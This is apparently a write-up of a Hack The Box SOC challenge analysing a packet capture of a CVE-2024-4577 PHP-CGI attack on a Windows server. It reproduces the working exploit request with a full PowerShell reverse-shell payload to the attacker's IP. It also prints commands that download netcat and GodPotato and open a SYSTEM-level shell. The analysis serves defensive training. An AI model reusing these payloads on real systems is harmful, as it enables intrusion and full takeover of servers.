---
title: "HTB-Packet_Puzzle"
date: 2026-01-31
draft: false
tags:
  - SOC
  - CVE-2024-4577
  - T1190
  - wireshark
platform: SOC
---
{{< infobox difficulty="Easy" os="Windows" date="2026-01-31" >}}

**Description:**
You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions.

### TL;DR
Analyzed network traffic showing exploitation of CVE-2024-4577 (PHP-CGI argument injection) against a Windows server running PHP 8.1.25. Attacker achieved RCE, established reverse shell on port 4545, then escalated privileges using GodPotato to spawn a SYSTEM-level shell on port 5555.


### Attacker Reconnaissance
Target Information:
\- PHP Version: `X-Powered-By: PHP/8.1.25`  
\- Victim IP: `192.168.170.130`  
\- Attacker IP: `192.168.170.128`  

Open ports discovered:  
\- 22/tcp - SSH  
\- 80/tcp - HTTP  
\- 135/tcp - RPC  
\- 139/tcp - NetBIOS  
\- 443/tcp - HTTPS  
\- 445/tcp - SMB  
\- 3389/tcp - RDP  
\- 5357/tcp - WSDAPI  

### Initial Exploitation
I filtered HTTP traffic and observed the attacker (192.168.170.128) testing PHP command execution with `<?php system('****');?>` payloads.
![alt text](image.png)

At **2025-01-22 09:47:32**, the attacker exploited a <span style="color:red">CVE-2024-4577</span> to gain a Reverse Shell to **192.168.170.128** on 4545/tcp

```
POST /?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: 192.168.170.130
User-Agent: curl/8.11.1
Accept: */*
Content-Length: 569
Content-Type: application/x-www-form-urlencoded

<?php system('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'192.168.170.128\',4545);$stream = $client.GetStream();[byte[]] $buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'); ?>
```

### CVE-2024-4577
In PHP versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8, when using Apache and PHP-CGI on Windows with certain code pages, Windows "Best-Fit" behavior replaces characters in command line arguments.

in this specific exploit:
```
%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
```
The soft hyphen (`%AD`) is converted to a standard hyphen (`-`) by Windows, resulting in:

1. `-d allow_url_include=1` - enables remote file inclusion
2. `-d auto_prepend_file=php://input` - executes code from POST body


### Privilege Escalation
Following the reverse shell connection on port 4545, the attacker downloaded tools and escalated privileges:

```powershell
PS > wget http://192.168.170.128:9696/nc64.exe -o time.exe
PS > iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe
PS > ./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```
1. Downloaded `nc64.exe` as `time.exe`
2. Downloaded `GodPotato-NET4.exe` as `TimeProvider.exe`
3. Used GodPotato to execute Netcat with SYSTEM privileges
4. Established privileged reverse shell on `192.168.170.128:5555`
